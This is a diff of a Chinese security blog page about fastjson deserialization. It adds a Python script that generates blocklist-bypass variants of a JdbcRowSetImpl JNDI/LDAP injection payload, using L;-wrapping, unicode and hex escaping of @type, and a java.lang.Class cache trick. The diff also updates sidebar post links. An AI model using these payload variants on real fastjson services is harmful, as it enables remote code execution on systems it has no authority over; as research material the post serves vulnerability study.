@@ -703,6 +703,9 @@
 <li><p>defineClass：什么都不做</p>
 </li>
 </ul>
+<p>一个fuzzing fastjson的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> JSONDecodeError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastJsonPayload</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, base_payload</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            json.loads(base_payload)</span><br><span class="line">        <span class="keyword">except</span> JSONDecodeError <span class="keyword">as</span> ex:</span><br><span class="line">            <span class="keyword">raise</span> ex</span><br><span class="line">        self.base_payload = base_payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_common</span>(<span class="params">self, payload, func</span>):</span><br><span class="line">        tmp_payload = json.loads(payload)</span><br><span class="line">        dct_objs = [tmp_payload]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(dct_objs) &gt; <span class="number">0</span>:</span><br><span class="line">            tmp_objs = []</span><br><span class="line">            <span class="keyword">for</span> dct_obj <span class="keyword">in</span> dct_objs:</span><br><span class="line">                <span class="keyword">for</span> key <span class="keyword">in</span> dct_obj:</span><br><span class="line">                    <span class="keyword">if</span> key == <span class="string">&quot;@type&quot;</span>:</span><br><span class="line">                        dct_obj[key] = func(dct_obj[key])</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">type</span>(dct_obj[key]) == <span class="built_in">dict</span>:</span><br><span class="line">                        tmp_objs.append(dct_obj[key])</span><br><span class="line">            dct_objs = tmp_objs</span><br><span class="line">        <span class="keyword">return</span> json.dumps(tmp_payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value增加L开头，;结尾的payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload1</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload, <span class="keyword">lambda</span> v: <span class="string">&quot;L&quot;</span> + v + <span class="string">&quot;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value增加LL开头，;;结尾的payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload2</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload, <span class="keyword">lambda</span> v: <span class="string">&quot;LL&quot;</span> + v + <span class="string">&quot;;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value进行\u</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload3</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload,</span><br><span class="line">                               <span class="keyword">lambda</span> v: <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> v.encode())).replace(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对@type的value进行\x</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload4</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.gen_common(payload,</span><br><span class="line">                               <span class="keyword">lambda</span> v: <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> v.encode())).replace(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成cache绕过payload</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_payload5</span>(<span class="params">self, payload: <span class="built_in">str</span></span>):</span><br><span class="line">        cache_payload = &#123;</span><br><span class="line">            <span class="string">&quot;rand1&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">                <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cache_payload[<span class="string">&quot;rand2&quot;</span>] = json.loads(payload)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(cache_payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">self</span>):</span><br><span class="line">        payloads = []</span><br><span class="line"></span><br><span class="line">        payload1 = self.gen_payload1(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload1</span><br><span class="line"></span><br><span class="line">        payload2 = self.gen_payload2(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload2</span><br><span class="line"></span><br><span class="line">        payload3 = self.gen_payload3(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload3</span><br><span class="line"></span><br><span class="line">        payload4 = self.gen_payload4(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload4</span><br><span class="line"></span><br><span class="line">        payload5 = self.gen_payload5(self.base_payload)</span><br><span class="line">        <span class="keyword">yield</span> payload5</span><br><span class="line"></span><br><span class="line">        payloads.append(payload1)</span><br><span class="line">        payloads.append(payload2)</span><br><span class="line">        payloads.append(payload5)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">            <span class="keyword">yield</span> self.gen_payload3(payload)</span><br><span class="line">            <span class="keyword">yield</span> self.gen_payload4(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fjp = FastJsonPayload(<span class="string">&#x27;&#x27;&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;rand1&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="string">    &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span></span><br><span class="line"><span class="string">    &quot;autoCommit&quot;: true</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> fjp.gen():</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
+
 
       </div>
       <div class="post-tags-categories">
@@ -946,6 +949,48 @@
             
 
             <div class="post-img-box">
+              <a href="/2024/10/28/snakeyaml/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8115.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8115.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-28</span>
+                
+              </div>
+              <a class="post-title" href="/2024/10/28/snakeyaml/">SnakeYaml反序列化分析</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2024/10/28/fastjson-1.2.68-commons-io-xie-wen-jian/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8114.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8114.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-28</span>
+                
+              </div>
+              <a class="post-title" href="/2024/10/28/fastjson-1.2.68-commons-io-xie-wen-jian/">fastjson 1.2.68漏洞分析及commons-io写文件</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
               <a href="/2024/10/26/c3p0-lian/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
                 <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8111.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8111.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
@@ -1000,48 +1045,6 @@
                 
               </div>
               <a class="post-title" href="/2024/10/24/fastjson-ref-diao-yong-getter/">fastjson $ref调用getter</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2024/10/21/groovy-lou-dong/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8110.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8110.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">10-21</span>
-                
-              </div>
-              <a class="post-title" href="/2024/10/21/groovy-lou-dong/">Groovy漏洞</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2024/10/15/jackson-lian/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8108.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8108.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">10-15</span>
-                
-              </div>
-              <a class="post-title" href="/2024/10/15/jackson-lian/">jackson 反序列化合集</a>
             </div>
           </div>
         
